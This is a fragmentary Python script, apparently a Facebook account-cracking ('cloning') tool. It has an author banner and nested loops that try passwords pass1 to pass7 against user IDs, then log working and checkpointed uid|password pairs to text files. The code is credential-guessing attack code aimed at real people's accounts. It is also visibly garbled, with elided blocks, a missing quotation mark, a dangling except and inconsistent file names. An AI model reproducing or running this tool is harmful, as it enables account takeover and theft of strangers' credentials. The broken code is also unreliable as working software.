...
logo = """
     \033[1;92m ____               _  ____          _    ___          ____
     \033[1;93m ||    \\             || ||     \\        ||   ||   \\      //   ||
     \033[1;92m ||      \\           || ||      \\       ||   ||     """"""""     ||
     \033[1;93m ||        \\         || ||       \\      ||   ||                  ||
     \033[1;92m.||          \\____|| ||        \\___||   ||                  ||
     \033[1;92m╚═══╝──╚╝──╚═══╝╚═══╝╚════╝╚╝─╚╝╚═══╝╚╝─╚╝
\033[1;93m----------------------------------------------------------------------------------------------------------
 \033[1;93m(*)\033[1;92m Author: https://www.facebook.com/javediqbalbalooch
 \033[1;93m(*)\033[1;92m WhatsApp :   +92342200814×
 \033[1;93m(*)\033[1;92m Github   : Javed
\033[1;93m----------------------------------------------------------------------------------------------------------
"""
def tool():
	os.system("clear")
...
def crack_select():
	...
	if select =="1":
		...
		try:
			...
			print(logo)
			print('')
			print("  🔥 JAVE-IQBAL🔥 START CRACKING.....")
			print('')
		...
		try:
			...
			print(logo)
			print('')
			print("  🔥 JAVED-IQBAL🔥 START CRACKING.....")
			print('')
			print("  Cloning from:\x1b[1;92m "+q["name"])
		except KeyError:
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m [NNM-OK] "+uid+" | "+pass1+"\033[0;97m")
				...
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;33m [NNM-CP] "+uid+" | "+pass1+"\033[0;97m")
					...
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;32m [NNM-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("Nazir ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;33m [NNM-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("ToOr cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;32m [NNM-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("Nazir ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;33m [NNM-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("ToOr cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;32m [NNM OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("Nazir ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;33m [NNM-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("ToOr cp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											...
											q = json.loads(data)
											if "access_token" in q:
												print(" \033[1;32m [NNM-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("Nazir ok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;33m [NNM-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("ToOr cp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													...
													q = json.loads(data)
													if "access_token" in q:
														print(" \033[1;32m [NNM-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open( Nazir ok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;33m [NNM -CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("NNM cp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															...
															q = json.loads(data)
															if "access_token" in q:
																print(" \033[1;32m [NNM-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("NNM ok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																oks.append(uid+pass7)
															else:
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;33m [NNM -CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("NNM cp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
											...
											if "access_token" in q:
												...
												if "www.facebook.com" in q["error_msg"]:
													...
													if "access_token" in q:
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;28m [Nnm-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("Nnm cp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
